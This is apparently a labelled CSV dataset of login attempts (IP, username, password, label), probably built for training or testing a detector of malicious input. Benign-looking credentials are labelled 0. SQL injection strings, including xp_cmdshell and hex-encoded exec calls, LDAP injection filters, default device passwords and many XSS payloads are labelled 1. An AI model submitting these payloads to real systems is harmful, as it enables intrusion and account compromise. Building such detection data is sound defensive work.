ip,username,password,label
205.237.203.110,cao,101@qq.com,0
190.251.49.91,1;SELECT%20*,*/*,1
13.214.174.167,cui,80586ghjkl;,0
2.232.192.8,ran,idc_2010,0
120.33.22.190,administrator,qsysopr,1
180.200.205.42,qian,black1/8,0
222.73.171.162,le,asdf_123,0
110.30.160.223,lin,10%sugar,0
195.61.244.134,ding,##ol2345678,0
48.238.40.180,sha,004e-mail,0
190.251.49.91,&apos;%20OR,';shutdown--,1
205.237.203.110,cao,101@qq.com,0
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
180.200.205.42,qian,black1/8,0
120.33.22.190,administrator,159753,1
110.30.160.223,lin,10%sugar,0
222.73.171.162,le,asdf_123,0
195.61.244.134,ding,##ol2345678,0
48.238.40.180,sha,004e-mail,0
190.251.49.91,or%201=1,asc,1
205.237.203.110,cao,101@qq.com,0
13.214.174.167,cui,80586ghjkl;,0
2.232.192.8,ran,idc_2010,0
120.33.22.190,administrator,rcustpw,1
180.200.205.42,qian,black1/8,0
222.73.171.162,le,asdf_123,0
110.30.160.223,lin,10%sugar,0
195.61.244.134,ding,##ol2345678,0
149.249.43.171,hua,1990t-bone,0
190.251.49.91,exec sp,' or uname like '%,1
205.237.203.110,cao,101@qq.com,0
2.232.192.8,niu,office97+,0
13.214.174.167,cui,80586ghjkl;,0
180.200.205.42,qian,black1/8,0
120.33.22.190,administrator,fal,1
222.73.171.162,le,asdf_123,0
110.30.160.223,lin,10%sugar,0
195.61.244.134,ding,##ol2345678,0
149.249.43.171,hua,1990t-bone,0
190.251.49.91,' (select top 1,handler,1
205.237.203.110,cao,101@qq.com,0
2.232.192.8,niu,office97+,0
13.214.174.167,cui,80586ghjkl;,0
180.200.205.42,qian,black1/8,0
120.33.22.190,administrator,secofr,1
222.73.171.162,le,as?f_123,0
110.30.160.223,lin,10%sugar,0
195.61.244.134,ding,##ol2345678,0
149.249.43.171,hua,1990t-bone,0
190.251.49.91,anything' OR 'x'='x,' or a=a--,1
205.237.203.110,cao,101@qq.com,0
2.232.192.8,niu,office97+,0
13.214.174.167,cui,80586ghjkl;,0
120.33.22.190,administrator,589589,1
180.200.205.42,qian,black1/8,0
222.73.171.162,le,asdfh123,0
110.30.160.223,lin,10%sugar,0
195.61.244.134,ding,##ol2345678,0
149.249.43.171,hua,1990t-bone,0
205.237.203.110,cao,101@qq.com,0
190.251.49.91,"""",tz_offset,1
2.232.192.8,niu,office97+,0
13.214.174.167,cui,80586ghjkl;,0
180.200.205.42,qian,black1/8,0
120.33.22.190,DSL,readwrite,1
222.73.171.162,le,asdf_123,0
110.30.160.223,lin,10%sugar,0
195.61.244.134,ding,##ol2345678,0
149.249.43.171,hua,1990t-bone,0
190.251.49.91,' (select top 1,'||UTL_HTTP.REQUEST,1
205.237.203.110,cao,101@qq.com,0
2.232.192.8,niu,offie97+,0
13.214.174.167,cui,80586ghjkl;,0
120.33.22.190,DSL,1q2w3e4r5t.,1
180.200.205.42,qian,black1/8,0
110.30.160.223,lin,10%sugar,0
222.73.171.162,le,asdf_123,0
149.249.43.171,hua,1990t-bone,0
195.61.244.134,ding,##ol2345678,0
205.237.203.110,cao,101e@qq.com,0
190.251.49.91,%2A%7C,%21,1
2.232.192.8,niu,office97+,0
13.214.174.167,cui,80586gjkl;,0
120.33.22.190,DSL,iscopy,1
180.200.205.42,qian,black1/8,0
110.30.160.223,lin,10%sugar,0
222.73.171.162,le,asdf_123,0
195.61.244.134,ding,##ol2345678,0
149.249.43.171,hua,1990t-bone,0
190.251.49.91,1;SELECT%20*,%28,1
205.237.203.110,cao,101@qq.com,0
13.214.174.167,cui,80586ghjkl;,0
2.232.192.8,niu,office9X7+,0
222.73.171.162,le,asdf_123,0
120.33.22.190,DSL,SECRET123,1
180.200.205.42,qian,black1/8,0
110.30.160.223,lin,10%sugar,0
205.237.203.110,cao,101@qq.com,0
149.249.43.171,hua,1990t-bone,0
195.61.244.134,ding,##ol2345678,0
190.251.49.91,/,having,1
2.232.192.8,niu,office97+,0
13.214.174.167,cui,80586ghjkl;,0
222.73.171.162,le,asdf_123,0
120.33.22.190,DSL,1q2w3e4r,1
180.200.205.42,qian,black1/8,0
110.30.160.223,lin,10%sugar,0
205.237.203.110,cao,101@qq.com,0
190.251.49.91,&apos;%20OR,' or userid like '%,1
195.61.244.134,ding,##ol2345678,0
149.249.43.171,hua,1990t-bone,0
13.214.174.167,bu,.cc444444,0
2.232.192.8,niu,office97+,0
222.73.171.162,le,asdf_123,0
120.33.22.190,DSL,core,1
110.30.160.223,lin,10%sugar,0
180.200.205.42,qian,black1/8,0
205.237.203.110,cao,101@qq.com,0
190.251.49.91,hi' or 1=1 --,'%20or%201=1,1
195.61.244.134,ding,##ol2345678,0
149.249.43.171,hua,1990t-bone,0
13.214.174.167,bu,.cc444444,0
2.232.192.8,niu,office97+,0
222.73.171.162,le,asdf_123,0
120.33.22.190,DSL,141414,1
180.200.205.42,qian,black1/J,0
110.30.160.223,lin,10%sugar,0
205.237.203.110,cao,101@qq.com,0
149.249.43.171,hua,1990t-bone,0
195.61.244.134,ding,##ol2345678,0
190.251.49.91,'||UTL_HTTP.REQUEST,' or '1'='1'--,1
13.214.174.167,bu,.cc444444,0
2.232.192.8,niu,office97+,0
222.73.171.162,le,asdf_123,0
120.33.22.190,DSL,redline,1
110.30.160.223,lin,10%sugar,0
180.200.205.42,qian,black1/8,0
205.237.203.110,cao,101@qq.com,0
195.61.244.134,ding,##ol2345678,0
149.249.43.171,hua,1990t-one,0
190.251.49.91,' or 'x'='x,1;SELECT%20*,1
2.232.192.8,niu,office97+,0
13.214.174.167,bu,.cc444444,0
120.33.22.190,DSL,GlobalAdmin,1
222.73.171.162,le,asdf_123,0
180.200.205.42,yue,)@139.com,0
110.30.160.223,lin,10%sugar,0
205.237.203.110,cao,101@qq.com,0
149.249.43.171,hua,1990t-bone,0
195.61.244.134,ding,##ol2345678,0
190.251.49.91,'; exec master..xp_cmdshell 'ping 172.10.1.255'--,'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
2.232.192.8,niu,office97+,0
13.214.174.167,bu,.cc444444,0
222.73.171.162,le,asdf_123,0
120.33.22.190,DSL,year2000,1
180.200.205.42,yue,)@139.com,0
110.30.160.223,lin,10%sugar,0
205.237.203.110,cao,101@qq.com,0
195.61.244.134,ding,##ol2345678,0
149.249.43.171,hua,1990t-bone,0
190.251.49.91,\x27UNION SELECT,\x3D \x3B',1
13.214.174.167,bu,.cc444444,0
2.232.192.8,niu,office97+,0
120.33.22.190,GPFD,qazwsx.,1
222.73.171.162,le,asdf_123,0
110.30.160.223,lin,10%sugar,0
180.200.205.42,yue,)@139.com,0
205.237.203.110,cao,101@qq.com,0
195.61.244.134,ding,##ol2345678j,0
149.249.43.171,hua,1990t-bone,0
190.251.49.91,'; exec master..xp_cmdshell 'ping 172.10.1.255'--,' or ''=',1
2.232.192.8,niu,offiye97+,0
13.214.174.167,bu,.cc444444,0
222.73.171.162,le,asdfm123,0
120.33.22.190,GPFD,MAINT,1
180.200.205.42,yue,)@139.com,0
110.30.160.223,lin,10%sugar,0
205.237.203.110,cao,101@qq.com,0
195.61.244.134,ding,##ol2345678,0
149.249.43.171,hua,1990t-bone,0
190.251.49.91,' or '' like ',\x27UNION SELECT,1
13.214.174.167,bu,.cc444444,0
2.232.192.8,niu,offiue97+,0
222.73.171.162,le,asdf_123,0
120.33.22.190,GPFD,PANAMA,1
110.30.160.223,lin,10%sugar,0
180.200.205.42,yue,)@139.com,0
205.237.203.110,cao,101@qq.com,0
25.159.120.149,wei,zmeK__1,0
149.249.43.171,hua,1990t-bone,0
181.73.94.59,yang,@126.com2168,0
2.232.192.8,niu,office97+,0
13.214.174.167,bu,.cc444444,0
120.33.22.190,GPFD,mtcl,1
54.141.118.138,yang,c++1392010,0
180.200.205.42,yue,)@139.com,0
110.30.160.223,lin,10%sugar,0
205.237.203.110,cao,101@qq.com,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,hua,1990t-bone,0
181.73.94.59,yang,@126.com2168,0
2.232.192.8,niu,office97+,0
13.214.174.167,bu,.cc444444,0
120.33.22.190,GPFD,DIGITAL,1
54.141.118.138,yang,c++139201,0
110.30.160.223,lin,10%sugar,0
180.200.205.42,yue,)@139.com,0
205.237.203.110,cao,101@qq.com,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,hua,1990t-bone,0
181.73.94.59,yang,@126.co;m2168,0
2.232.192.8,niu,office97+,0
13.214.174.167,bu,.cc444444,0
54.141.118.138,yang,c++1392010,0
120.33.22.190,GPFD,adtran,1
110.30.160.223,lin,10%sugar,0
180.200.205.42,yue,)@139.com,0
205.237.203.110,cao,101@qq.com,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,hua,1990t-bone,0
181.73.94.59,yang,@126.com2168,0
2.232.192.8,niu,office97+,0
13.214.174.167,bu,.cc444444,0
54.141.118.138,yang,c++1392010,0
120.33.22.190,GPFD,BATCH,1
206.33.89.152,gu,@yahoo.cn007,0
180.200.205.42,yue,)@139.com,0
205.237.203.110,cao,101@qq.com,0
149.249.43.171,hua,1990t-bone,0
25.159.120.149,wei,zmey__1,0
181.73.94.59,yang,@126.com2168,0
13.214.174.167,bu,.cc444444,0
2.232.192.8,niu,office97+,0
54.141.118.138,yang,c++1392010,0
120.33.22.190,GPFD,iloveyou,1
206.33.89.152,gu,@yahoo.cn007,0
180.200.205.42,yue,)@139.com,0
205.237.203.110,bai,10%myweb,0
149.249.43.171,xu,6719.org,0
25.159.120.149,wei,zmey__1,0
181.73.94.59,yang,S@126.com2168,0
2.232.192.8,niu,office97+,0
13.214.174.167,bu,.cc444444,0
120.33.22.190,GPFD,BACKUP,1
54.141.118.138,yang,c++1392010,0
180.200.205.42,yue,)@139.com,0
206.33.89.152,gu,@yahoo.cn007,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
2.232.192.8,niu,office97+,0
13.214.174.167,bu,.cc444444,0
54.141.118.138,yang,c++1392010,0
120.33.22.190,GPFD,HPLASER,1
180.200.205.42,yue,)@139.com,0
206.33.89.152,gu,@yahoo.cn007,0
205.237.203.110,bai,10%myweb,0
149.249.43.171,xu,6789.org,0
25.159.120.149,wei,zmey__1,0
181.73.94.59,yang,@126.com2168,0
2.232.192.8,niu,officeT97+,0
13.214.174.167,bu,.cc44$4444,0
54.141.118.138,yang,c++1392010,0
253.133.235.15,"perl -e ';print "";<;IM SRC=java\0script:alert(1920)>"";;';>; out","</span></span><svg onload=""alert(1976)//“ #""="""">",1
180.200.205.42,yue,)@139.com,0
206.33.89.152,gu,@yahoo.cn007,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
2.232.192.8,niu,office97+,0
13.214.174.167,bu,.cc444444,0
253.133.235.15,"<svg onUnload svg onUnload=""javascript:javascript:alert(327)""></svg onUnload>","<img src=x onerror=\x32""javascript:alert(630)"">",1
54.141.118.138,yang,c++1392010,0
206.33.89.152,gu,@yahoo.cn007,0
180.200.205.42,yue,)@139.com,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,"@1""26.com2168",0
2.232.192.8,niu,Doffice97+,0
13.214.174.167,bu,.Dc444444,0
54.141.118.138,yang,c++1392010,0
253.133.235.15,<? echo('<SCR)';echo('IPT>alert(766)</SCRIPT>'); ?>,"<style><img src=""</style><img src=x onerror=javascript:alert(1492)//"">",1
180.200.205.42,yue,)@139.com,0
206.33.89.152,gu,@yahoo1.cn007,0
205.237.203.110,bai,10%myweb,0
149.249.43.171,xu,6789.org,0
25.159.120.149,wei,zmey__1,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,having,' and '' like ''--,1
13.214.174.167,bu,.cc444444,0
54.141.118.138,yang,c++1392010,0
253.133.235.15,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert(751)"")}</STYLE>","<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(874)</script>"">",1
206.33.89.152,gu,@yahoo.cn007,0
180.200.205.42,yue,)@139.com,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,0 or 1=1,delete,1
13.214.174.167,bu,.cc444444,0
253.133.235.15,<IMG SRC=`javascript:alert(718)`>,<brute onclick=alert(174)>click this!,1
54.141.118.138,yang,c++1392010,0
180.200.205.42,yue,)@139.com,0
206.33.89.152,gu,@yahoo.cn007,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,%29,' or ''=',1
13.214.174.167,bu,.cc444444,0
253.133.235.15,<body onfocus=alert(142)>,žscriptualert(889)ž/scriptu,1
54.141.118.138,yang,c++1392010,0
180.200.205.42,yue,)@139.com,0
206.33.89.152,gu,@yahoo.cn007,0
205.237.203.110,bai,10%myweb,0
149.249.43.171,xu,6789.torg,0
25.159.120.149,wei,zmey__1,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,a' or 3=3--,' and '' like '%,1
13.214.174.167,bu,.cc444444,0
253.133.235.15,&lt;IMG SRC=JaVaScRiPt:alert(1839)&gt;,"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1290);}</script>",1
54.141.118.138,yang,c++1392010,0
180.200.205.42,yue,)@139.com,0
206.33.89.152,gu,@yaho.cn007,0
205.237.203.110,bai,10%mywe,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,admin'--,PRINT,1
13.214.174.167,bu,.cc444444,0
253.133.235.15,"<;IMG SRC="";jav&;#x0D;ascript:alert(1919);"";>;","""/><img/onerror=\x22javascript:alert(1438)\x22src=xxx:x />",1
54.141.118.138,yang,c++1392010,0
180.200.205.42,yue,)@139.com8,0
206.33.89.152,gu,@yahoo.cn007,0
205.237.203.110,bai,10%myweb,0
149.249.43.171,xu,6789.org,0
25.159.120.149,wei,zmey__1,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,"<>""'%;)(&+",*(|(objectclass=*)),1
13.214.174.167,bu,.cc444444,0
54.141.118.138,yang,c++1392010,0
253.133.235.15,"<IMG SRC=x onkeydown=""alert(1083))"">",<;<;SCRIPT>;alert(1925);//<;<;/SCRIPT>;,1
206.33.89.152,gu,@yahoo.cn007,0
180.200.205.42,yue,)@139.com,0
205.237.203.110,bai,10%myweb1,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,%2A%28%7C%28objectclass%3D%2A%29%29,'; exec xp_regread,1
13.214.174.167,bu,.cc444444,0
54.141.118.138,yang,c++1392010,0
253.133.235.15,"<BODY BACKGROUND=""javascript:alert(738)"">","<body onPopState body onPopState=""javascript:javascript:alert(332)""></body onPopState>",1
180.200.205.42,yue,)@19.com,0
206.33.89.152,gu,@yahoo.cn007,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,xu,6789./rg,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,\x27\x6F\x72 SELECT *,' or uname like '%,1
13.214.174.167,bu,.cc444444,0
253.133.235.15,"<img \x47src=x onerror=""javascript:alert(599)"">",654<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x4654vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(654)&gt;`>,1
54.141.118.138,yang,c++1392010,0
206.33.89.152,gu,@yahoo.cn007,0
180.200.205.42,yue,)@139.com,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,wei,zmey__1,0
149.249.43.171,xu,6789.og,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,*/*,//*,1
74.126.116.34,"<>""'%;)(&+",or a=a,1
253.133.235.15,"<a href=""\x09javascript:javascript:alert(1352)"" id=""fuzzelement1352"">test</a>","<img src=x\x6210onerror=""javascript:alert(621)"">",1
54.141.118.138,yang,c++1392010,0
180.200.205.42,yue,)@139.com,0
206.33.89.152,gu,@yahoo.cn007,0
205.237.203.110,bai,10%mywNb,0
149.249.43.171,xu,6789.org,0
25.159.120.149,wei,zmey__1,0
181.73.94.59,yang,126.com2168,0
180.15.61.104,handler,limit,1
74.126.116.34,distinct,' or userid like '%,1
253.133.235.15,"<IMG SRC=x onchange=""alert(1075))"">","<STYLE type=""text/css"">BODY{background:url(""javascript:alert(1666)"")}</STYLE>",1
54.141.118.138,yang,c++1392010,0
206.33.89.152,gu,@yahoo.cn007,0
180.200.205.42,yue,)@139.com,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,jiang,.net999999,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
74.126.116.34,PRINT,&lt;&gt;&quot;'%;)(&amp;+,1
180.15.61.104,""" or ""a""=""a",""" or ""a""=""a",1
54.141.118.138,yang,c++1392010,0
253.133.235.15,"<a href=""\xE2\x81383\x9Fjavascript:javascript:alert(1383)"" id=""fuzzelement1383"">test</a>","ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(432)"">DEF",1
180.200.205.42,yue,)@139.com,0
206.33.89.152,gu,@yahoo.cn007,0
205.237.203.110,bai,10%myweb,0
149.249.43.171,xu,6789.org,0
25.159.120.149,jiang,.net999999,0
181.73.94.59,yang,@126.com2168,0
74.126.116.34,= ;,/,1
180.15.61.104,%29,""" or ""a""=""a",1
253.133.235.15,veris-->group<svg/onload=alert(1051)//,<brute onmousedown=alert(185)>click this!,1
54.141.118.138,yang,c++1392010,0
180.200.205.42,yue,)@139.com,0
206.33.89.152,gu,@yahoo.cn007,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,jiang,.net999999,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,!,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
74.126.116.34,"hi or 1=1 --""",&lt;&gt;&quot;'%;)(&amp;+,1
253.133.235.15,"""><SCRIPT>alert(1786))</SCRIPT><img src="""" alt=""",onmouseover=¡¯alert(9)¡¯,1
54.141.118.138,yang,c++1392010,0
206.33.89.152,gu,@yahoo.cn007,0
143.195.150.193,ling,VKizsj6NG*9a,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,jiang,.net999999,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,') or ('a'='a,(sqlattempt2),1
74.126.116.34,""" or ""x""=""x",23 OR 1=1,1
253.133.235.15,<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(641)'}{}*{-o-link-source:current}]{color:red};</style>,"&lt;IMG STYLE=\""xss&#58;expr/*XSS*/ession(alert(900))\""&gt;",1
54.141.118.138,yang,c++1392010,0
206.33.89.152,gu,@yahoo.cn00~7,0
143.195.150.193,ling,VKizsj6NG*9a,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,jiang,.net999999,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,' or 1=1 or ''=',like,1
74.126.116.34,' --,' or uid like '%,1
54.141.118.138,yang,c++1392010,0
253.133.235.15,"<img\x47src=x onerror=""javascript:alert(606)"">","<style><img src=""</style><img src=x onerror=javascript:alert(578)//"">",1
143.195.150.193,ling,VKiQsj6NG*9a,0
206.33.89.152,tian,.net9213,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,jiang,.net999999,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
74.126.116.34,\x27\x6F\x72 SELECT *,"hi"") or (""a""=""a",1
180.15.61.104,‘ or 1=1 --,--,1
54.141.118.138,yang,c++1392010,0
253.133.235.15,<script>({0:#0=eval/#0#/#0#(javascript:alert(1563))})</script>,<script>1748 1748 = 1; alert(1748)</script>,1
143.195.150.193,ling,VKizsj6NG*9a,0
206.33.89.152,tian,.net9213,0
205.237.203.110,bai,10%myweb,0
149.249.43.171,xu,6789.org,0
25.159.120.149,jiang,.net9;99999,0
181.73.94.59,yang,@126.cfom2168,0
180.15.61.104,x' AND userid IS NULL; --,a' or 'a' = 'a,1
74.126.116.34,(,"or 0=0 #""",1
253.133.235.15,"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1624)&amp;gt;>"">",http://www.google<script .com>alert(813)</script,1
54.141.118.138,yang,c++1392010,0
143.195.150.193,ling,VKizsj6NG*9a,0
206.33.89.152,tian,.net9213,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,jiang,.net999999,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.com2168,0
180.15.61.104,',or,1
74.126.116.34,*(|(objectclass=*)),or a=a,1
54.141.118.138,yang,c++1392010,0
253.133.235.15,"<a href=""\x479Bjavascript:javascript:alert(479)"" id=""fuzzelement479"">test</a>",http://www.google<script .com>alert(813)</script,1
206.33.89.152,tian,.net9213,0
143.195.150.193,ling,VKizsj6NG*9a,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,jiang,.net999999p,0
149.249.43.171,xu,6789.org,0
181.73.94.59,yang,@126.cm2168,0
180.15.61.104,' and '' like ',as,1
74.126.116.34,anything' OR 'x'='x,' (select top 1,1
253.133.235.15,">""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(1944)>","`""'><img src=xxx:x \x00onerror=javascript:alert(498)>",1
54.141.118.138,yang,c++1392010,0
143.195.150.193,ling,VKizsj6NG*9a,0
206.33.89.152,tian,.net9213,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,jiang,.Hnet999999,0
149.249.43.171,xu,6789.org,0
181.73.94.59,jie,@139.com1288,0
180.15.61.104,?,*(|(mail=*)),1
74.126.116.34,--,tz_offset,1
253.133.235.15,"alert(1626))//"";alert(1626))//--",<script>javascript:alert(356)</script\x0B,1
54.141.118.138,dai,@q(.com4321,0
206.33.89.152,tian,.net9213,0
143.195.150.193,ling,VKizsj6NG*9a,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,jiang,.net999999,0
149.249.43.171,chai,4_LiFe,0
181.73.94.59,jie,@139.com1288,0
36.215.229.108,<iframe// src=javaSCRIPT&colon;alert(1157),<video poster=javascript:javascript:alert(565)//,1
74.126.116.34,"hi"" or ""a""=""a",or 0=0 --,1
253.133.235.15,"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert(896))\""&gt;","<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1583)>",1
54.141.118.138,dai,@qq.com4321,0
206.33.89.152,tian,.net9213,0
143.195.150.193,ling,VKizsj6NG*9a,0
205.237.203.110,bai,10%myweb,0
25.159.120.149,jiang,.net999999,0
149.249.43.171,chai,4_LiFe,0
181.73.94.59,jie,@139.com1288,0
36.215.229.108,"<a href=""\x0Bjavascript:javascript:alert(1333)"" id=""fuzzelement1333"">test</a>",+ACIAPgA8-script+AD4-alert(976)+ADw-/script+AD4APAAi-,1
74.126.116.34,' and '' like ''--,limit,1
54.141.118.138,dai,@qq.com4321,0
206.153.161.142,tai,50%1q2w3e4r,0
206.33.89.152,tian,.net9213J,0
143.195.150.193,ling,VKizsj6NG*9a,0
205.237.203.110,bai,10%myweb,0
149.249.43.171,chai,4_LiFe,0
25.159.120.149,jiang,.net999999,0
181.73.94.59,jie,@139.com1288,0
74.126.116.34,""" or 1=1 or """"=""",%2A%28%7C%28mail%3D%2A%29%29,1
36.215.229.108,"<IMG LOWSRC=""javascript:alert(1797)"">","<img src=x onerror=\x00""javascript:alert(631)"">",1
206.153.161.142,tai,50%1q2w3e4r,0
54.141.118.138,dai,@qq.com4321,0
206.33.89.152,tian,.net9213,0
143.195.150.193,ling,VKizsj6NG*9a,0
205.237.203.110,bai,10%myweb,0
149.249.43.171,chai,4_LiFe,0
25.159.120.149,jiang,.net999999,0
181.73.94.59,jie,@139.com1288,0
74.126.116.34,%20'sleep%2050',' or (EXISTS),1
36.215.229.108,"""`'><script>\xE514\x9A\x80javascript:alert(514)</script>",<IMG SRC=javascript:alert(1717)>,1
54.141.118.138,dai,@qq.com4321,0
206.153.161.142,tai,50%1q2w3e4r,0
206.33.89.152,tian,.net9213,0
205.237.203.110,bai,10%myweb,0
143.195.150.193,ling,VKizsj6NG*9a,0
25.159.120.149,jiang,.net999999,0
149.249.43.171,chai,4_LiFe,0
181.73.94.59,jie,@159.com1288,0
74.126.116.34,' or uid like '%,' or uid like '%,1
36.215.229.108,"""/><img/onerror=\x22javascript:alert(1438)\x22src=xxx:x />",'><script>alert(221)</script>,1
54.141.118.138,dai,@qq.com4321,0
206.153.161.142,tai,50%1q2w3e4r,0
206.33.89.152,tian,.net9213,0
205.237.203.110,fu,password1.,0
143.195.150.193,ling,VKizsj[NG*9a,0
149.249.43.171,chai,4_LiFe,0
25.159.120.149,jiang,.net999@999,0
181.73.94.59,jie,@139.com1288,0
36.215.229.108,"<img\x6030src=x onerror=""javascript:alert(603)"">",<IMG SRC=javascript:alert(995)>,1
74.126.116.34,select,tz_offset,1
54.141.118.138,dai,@qq.com4321,0
206.153.161.142,tai,50%1q2w3e4r,0
143.195.150.193,ling,VKizsj6NG*9a,0
206.33.89.152,tian,.net9213,0
205.237.203.110,fu,password1.,0
25.159.120.149,jiang,.net999999,0
149.249.43.171,chai,4_LiFe,0
181.73.94.59,jie,@139.com1288,0
74.126.116.34,' --,x' AND userid IS NULL; --,1
36.215.229.108,"<;DIV STYLE="";background-image: url(javascript:alert(1880))"";>;","""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(387);/*';"">DEF",1
54.141.118.138,dai,@qq.com4321,0
206.153.161.142,tai,50%1q2w3e4r,0
206.33.89.152,tian,.net9213,0
205.237.203.110,fu,password1.,0
143.195.150.193,ling,VKizsj6NG*9a,0
149.249.43.171,chai,4_LiFe,0
25.159.120.149,jiang,.net99999J,0
181.73.94.59,jie,@139.com1288,0
